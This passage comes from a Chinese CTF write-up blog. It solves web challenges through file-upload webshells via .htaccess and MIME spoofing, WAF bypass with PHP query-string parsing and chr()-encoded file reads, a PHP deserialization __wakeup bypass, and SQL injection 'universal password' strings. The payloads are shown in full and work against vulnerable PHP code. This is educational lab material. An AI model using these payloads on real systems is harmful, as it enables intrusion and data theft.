只返回extension</p></blockquote><p>从源码中可以看出只对上传后的文件更名并移到upload目录下，并没有删除</p><h4 id="总结一下ctf文件上传题中常见考点">总结一下CTF文件上传题中常见考点</h4><ul><li>利用中间件解析漏洞绕过检查，实战常用</li><li>上传.user.ini或.htaccess将合法拓展名文件当作php文件解析</li><li>%00截断绕过</li><li>php3后缀解析</li><li>php4文件</li><li>php5文件</li><li>php7文件</li><li>phtml文件</li><li>phps文件</li><li>pht文件</li></ul><h2 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</h2><h3 id="考点.htaccessmime后缀">考点：.htaccess、mime+后缀</h3><p>上传一句话，图片马都不行，后端验证</p><p>那就上传.htaccess文件，<strong>==修改mime为image/jpeg==</strong>，发现成功上传，这样就可以让 <strong>jpg</strong>解析为 <strong>php</strong></p><blockquote><p><strong><a href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">htaccess</a>文件是Apache服务器中的一个配置文件，它负责所在目录下的网页解析配置</strong></p><p><strong>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，且子目录中的指令会覆盖父目录或者主配置文件中的指令</strong></p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214174709873.png" alt="image-20220214174709873" style="zoom:67%;"></p><p>上传一个一句话木马php文件</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175230427.png" alt="image-20220214175230427" style="zoom: 80%;"></p><p>修改后缀、mime，成功上传</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175305517.png" alt="image-20220214175305517" style="zoom:67%;"></p><p>成功访问</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175337259.png" alt="image-20220214175337259" style="zoom: 50%;"></p><p>蚁剑连接得到flag，不知道为啥直接hackbar shell=echo `cat /flag`不行</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175930523.png" alt="image-20220214175930523" style="zoom:67%;"></p><p>源码分析，对后缀有限制：含ph就不行，对文件类型即mime有限制，得是image类，对大小也有限制，然后就直接输出文件内容，把上传的文件移动到新目录下</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start();<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;    $_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>] = md5((<span class="hljs-keyword">string</span>)time() . (<span class="hljs-keyword">string</span>)rand(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>));&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>])) &#123;    $target_path  = getcwd() . <span class="hljs-string">&quot;/upload/&quot;</span> . md5($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]);  <span class="hljs-comment">//getcwd在这里是/var/www/html</span>    $t_path = $target_path . <span class="hljs-string">&quot;/&quot;</span> . basename($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//$t_path是/var/www/html+md5+文件名</span>    $uploaded_name = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];  <span class="hljs-comment">//文件全名，包含后缀</span>    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);  <span class="hljs-comment">//后缀为最后一个点后面的</span>    $uploaded_size = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];    $uploaded_tmp  = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];     <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>, strtolower($uploaded_ext)))&#123;  <span class="hljs-comment">//不区分大小写，遇到含ph的后缀就die</span>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我扌your problem?&quot;</span>);    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span> ((($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;</span><span class="hljs-string">            &quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/pjpeg&quot;</span>)|| ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>)) &amp;&amp; ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">2048</span>))&#123;            $content = file_get_contents($uploaded_tmp);  <span class="hljs-comment">//输出临时文件内容</span>mkdir(iconv(<span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;GBK&quot;</span>, $target_path), <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);move_uploaded_file($uploaded_tmp, $t_path);  <span class="hljs-comment">//移动临时文件到/var/www/html+md5+文件</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我扌your problem?&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>getcwd():获取当前目录，在这里是/var/www/html</p><p>getcwd()返回URL中引用的“main”脚本的路径。</p><p>dirname(<strong>FILE</strong>)将返回当前执行脚本的路径。</p><p><strong><a href="https://www.php.cn/php-weizijiaocheng-415346.html">basename()</a>函数用于返回文件路径中的文件名部分</strong></p><ul><li><p>$file = "/phpstudy/WWW/index.php";</p></li><li><p>echo basename($file);//带有文件扩展名 index.php</p></li><li><p>echo basename($file,'.php'); //去除文件扩展名 index</p></li></ul><p>strrpos()函数查找字符串在另一字符串中<strong>最后一次</strong>出现的位置（区分大小写）</p><p>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</p><p>substr() 函数返回字符串第二个参数开始（包括）的后半部分。</p><p>文件上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。</p><h2 id="roarctf-2019easy-calc">[RoarCTF 2019]Easy Calc</h2><h3 id="考点phpwaf字符串解析特性绕过php扫目录scandir读文件readfile编码绕过ascii">考点：php+waf字符串解析特性绕过、php扫目录scandir、读文件readfile、编码绕过ascii</h3><blockquote><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">csdnwp</a></p><p><a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">参考个人博客wp</a></p></blockquote><p>输入字符被403</p><p><strong>返回403？一般都是PHP过滤的。这里403.应该就是题目说的WAF了</strong><strong>那么整个处理流程应该是。前端服务器WAF过滤。-&gt;后端PHP黑名单过滤</strong></p><p>查看源码</p><pre><code class="hljs javascript">$(<span class="hljs-string">&#x27;#calc&#x27;</span>).submit(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    $.ajax(&#123;        url:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).val()), <span class="hljs-comment">//获取标签的值并进行url编码</span>        type:<span class="hljs-string">&#x27;GET&#x27;</span>,        success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;            $(<span class="hljs-string">&quot;#result&quot;</span>).html(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span><span class="hljs-string">        &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span><span class="hljs-string">        &lt;/div&gt;`</span>);        &#125;,        error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;            alert(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);        &#125;    &#125;)    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;)</code></pre><p>calc.php?num=”+encodeURIComponent($(“#content”).val()是什么意思？</p><p>("#content")相当于document.getElementById("content");获取id为content的HTML标签元素</p><p>而(“#content”).val()相当于document.getElementById(“content”).value;获取id为content的HTML标签元素的值</p><p>encodeURIComponent(str);将字符串url编码</p><p>访问calc.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//num没有值就返回calc源码</span>&#125;<span class="hljs-keyword">else</span>&#123;        $str = $_GET[<span class="hljs-string">&#x27;num&#x27;</span>];        $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $str)) &#123;                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);                &#125;        &#125;        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$str.<span class="hljs-string">&#x27;;&#x27;</span>);  <span class="hljs-comment">//已有echo</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>正则表达式模式修饰符 m：多行匹配，不受</p><p>尝试字母，forbidden，<strong>特殊字符好像就直接页面错误，，这应该是waf！！！</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214213717838.png" alt="image-20220214213717838" style="zoom:67%;"></p><h4 id="php的字符串解析特性">PHP的字符串解析特性</h4><ol type="1"><li><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：/?foo=bar变成Array([foo]=&gt;“bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id]=&gt; 42)。</p></li><li><p>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<code>/news.php?%20news[id%00=42"+AND+1=0–</code>(<strong>waf识别出参数是%20news[id%00而不是目标参数而不去拦截，实际到php那里，参数是news_id</strong>)</p></li><li><p>php需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p></li></ol><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>删除空白符<span class="hljs-number">2.</span>将某些字符转换为下划线（包括空格）</code></pre><ol start="4" type="1"><li>那么如果waf不允许num变量传递字母：</li></ol><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com<span class="hljs-regexp">/index.php?num = aaaa   /</span><span class="hljs-regexp">/显示非法输入的话</span></code></pre><p>那么我们可以在num前加个空格：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com/index.php? num = aaaa</code></pre><p>waf以为是 num参数而不去拦截，而php解析出num参数赋值</p><p>、==》成功绕过waf</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214215614832.png" alt="image-20220214215614832" style="zoom:67%;"></p><p>scandir()：函数返回一个数组，其中包含指定路径中的文件和目录，不会回显</p><p>==需要配合<strong>print_r</strong>或<strong>var_dump</strong>输出数组==</p><p><strong>由于“/”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取</strong>【/的ASCII:47】</p><p>payload：</p><ol type="1"><li>读取根目录</li></ol><pre><code class="hljs reasonml">/calc.php? num=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">chr</span>(47)</span>));</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214230658219.png" alt="image-20220214230658219"></p><ol start="2" type="1"><li>读取flag？屏蔽了``，不能命令执行，php读文件函数：<strong>file_get_contents</strong></li></ol><ul><li><strong><em>file_get_contents()把整个文件内容读入一个字符串中。<span style="background:#FF9999;">函数返回读取到的数据，</span></em></strong>，而原php代码已有echo，无需再打印</li><li><strong>PHP使用 标准的 点 连接符拼接</strong></li><li>payload:</li></ul><pre><code class="hljs angelscript">/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)));/calc.php?%<span class="hljs-number">20</span>num=file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>));即file_get_contents(/f1agg)</code></pre><p>或者</p><p>scandir可以用base_convert函数构造，但是利用base_convert只能解决<code>a~z</code>的利用，因为根目录需要/符号，且不在<code>a~z</code>,所以需要hex2bin(dechex(47))这种构造方式，dechex()函数把十进制数转换为十六进制数。hex2bin()函数把十六进制值的字符串转换为ASCII字符,用readfile读取文件</p><ul><li><em><strong>readfile()函数: 输出一个文件。</strong><strong>该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回false。您可以通过 <span class="citation" data-cites="readfile">@readfile</span>()形式调用该函数，来隐藏错误信息。</strong></em></li></ul><p>payload:</p><pre><code class="hljs angelscript">base_convert(<span class="hljs-number">2146934604002</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(hex2bin(dechex(<span class="hljs-number">47</span>)).base_convert(<span class="hljs-number">25254448</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>))即readfile(/f1agg)</code></pre><p>Q1：其他的函数如system执行系统命令可以吗？不行，因为phpinfo里可以看到禁用了<strong>system、exec这一类命令执行的函数</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214232523093.png" alt="image-20220214232523093"></p><h4 id="q2http走私攻击">Q2：HTTP走私攻击</h4><blockquote><p><a href="https://paper.seebug.org/1048/">**协议层的攻击——HTTP请求走私，seebug介绍</a></p><p><a href="https://mayi077.gitee.io/2020/01/24/RoarCTF-2019-Easy-Calc/">相关WP1</a></p><p><a href="https://guokeya.github.io/post/4e7t6Raji/">WP2</a></p><p><a href="https://guokeya.github.io/post/AQdKm74xy/">**各分类介绍和例题</a></p></blockquote><p><strong>TE-CL</strong></p><p>前端根据TE来解析。所有请求都被算上了 后端根据CL来解析。22。GET/admin就成了新的请求</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/1579173913376.png"></p><p><strong>CL-CL</strong></p><p>当代理服务器和后端服务器接收多个CL。返回400错误。代理服务器使用第一个CL处理数据。后端服务器使用第二个CL处理数据【<strong>数据到达服务器端</strong>】</p><p>这里GET/POST都可以</p><p><img src="https://guokeya.github.io/post-images/1579177518794.png"></p><p><img src="https://pic.downk.cc/item/5e2968b82fb38b8c3c43771b.jpg" alt="大佬图片"></p><p>CL-CL：在这题大概意思是一个消息同时加上两个Content-Length，POST请求+GET请求url参数，会导致400报错，前端接受的是POST请求，但是get请求到了后端，服务器端会回显get结果</p><p>Q3:字符串转ASCII，php：不能直接转，除非工具，需要挨个字符转，chr()，再<code>.</code>连接起来</p><blockquote><p>https://evilcos.me/lab/xssor/</p></blockquote><p>先转10en，再替换,为).chr(</p><h2 id="极客大挑战-2019php">[极客大挑战 2019]PHP</h2><h3 id="考点备份php反序列化跳过__wakeup">考点：备份、php反序列化、跳过__wakeup()</h3><p><span style="background:#FF9999;">属性个数的值大于实际属性个数时，会跳过__wakeup()函数的执行</span></p><p>提示网站备份，访问www.zip，得到源码和假flag</p><p><a href="https://blog.csdn.net/qq_35599248/article/details/119396936">dirsearch</a>参数解析</p><pre><code class="hljs diff"><span class="hljs-deletion">-i         保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)</span><span class="hljs-deletion">-w,--wordlists              自定义wordlist(以逗号分隔</span><span class="hljs-deletion">-e,--extensions             包含的文件拓展名(逗号分隔) /指定网站语言  如-e php,asp</span><span class="hljs-deletion">-u,--url                    目标url</span></code></pre><p>index.php关键php：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;$select = $_GET[<span class="hljs-string">&#x27;select&#x27;</span>];$res=unserialize(@$select);   <span class="hljs-comment">//①  res为对象</span><span class="hljs-meta">?&gt;</span></code></pre><p>反序列化：new创造对象时触发construct构造函数，unserialize时触发wakeup，结束后触发destruct析构函数</p><p>class.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = $username;        <span class="hljs-keyword">$this</span>-&gt;password = $password;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//②</span>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//③</span>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;  <span class="hljs-comment">//绕过这里</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">die</span>();        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;   <span class="hljs-comment">//关键点  ④</span>            <span class="hljs-keyword">global</span> $flag;  <span class="hljs-comment">//可以变量覆盖</span>            <span class="hljs-keyword">echo</span> $flag;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;            <span class="hljs-keyword">die</span>();        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>关键：</p><pre><code class="hljs elixir">不满足<span class="hljs-variable">$this</span>-&gt;password != <span class="hljs-number">100</span>满足<span class="hljs-variable">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>但是第②步的时候username被初始化变为了guest</code></pre><p><strong>问题就来了，在反序列化的时候会首先执行</strong><code>__wakeup()</code><strong>魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过</strong><code>__wakeup()</code><strong>，而去执行</strong><code>__destruct</code>——==属性个数的值大于实际属性个数时，会跳过__wakeup()函数的执行==</p><p>构造序列化：最完整：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = $username;        <span class="hljs-keyword">$this</span>-&gt;password = $password;    &#125;&#125;$a = <span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);var_dump(serialize($a));<span class="hljs-meta">?&gt;</span></code></pre><p>private版执行结果</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;修改属性个数：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre><p>简洁:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<span class="hljs-keyword">public</span> $username=<span class="hljs-string">&#x27;admin&#x27;</span>;<span class="hljs-keyword">public</span> $password= <span class="hljs-number">100</span>;&#125; $flag = <span class="hljs-keyword">new</span> Name();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> $flag_1;<span class="hljs-meta">?&gt;</span></code></pre><p>简洁版执行结果：</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;修改属性个数：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre><p>但还是不行/???</p><h4 id="private">private</h4><p>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见</p><p><strong>private属性被序列化后属性值会变成<code>%00类名%00属性名</code>,则需在创造对象后根据规则进行修改，长度也要加上%00</strong></p><p>payload1：</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220217220200027.png" alt="image-20220217220200027"></p><p>==<strong>注意❗⚠：可以进行url编码，防止%00对应的不可打印字符在复制时丢失</strong>==，payload2：</p><pre><code class="hljs php"><span class="hljs-comment">#未编码直接序列化private：</span><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;  //无法成功</span><span class="hljs-keyword">echo</span> urlencode(serialize($a));<span class="hljs-comment">#编码后：可以成功得到flag</span>O%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A100%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<span class="hljs-comment">#再将Name后面的2换成3或其他值即可</span></code></pre><h2 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL</h2><h4 id="考点关键词替换为空后回显部分数据">考点：关键词替换为空后回显部分数据</h4><h4 id="万能密码位置">万能密码，位置？</h4><blockquote><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p><p>要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’or true，所以返回值就是true。</p><p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or1，那么返回值也是true。（xxx指代任意字符）</p><p><strong>只要'or'后面的字符串为一个非零的数字开头都会返回True</strong></p><pre><code class="hljs awk">select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1abcdefg&#x27;</span>    ---&gt;  Trueselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0abcdefg&#x27;</span>    ---&gt;  Falseselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1&#x27;</span>           ---&gt;  Trueselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;2&#x27;</span>           ---&gt;  Trueselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0&#x27;</span>           ---&gt;  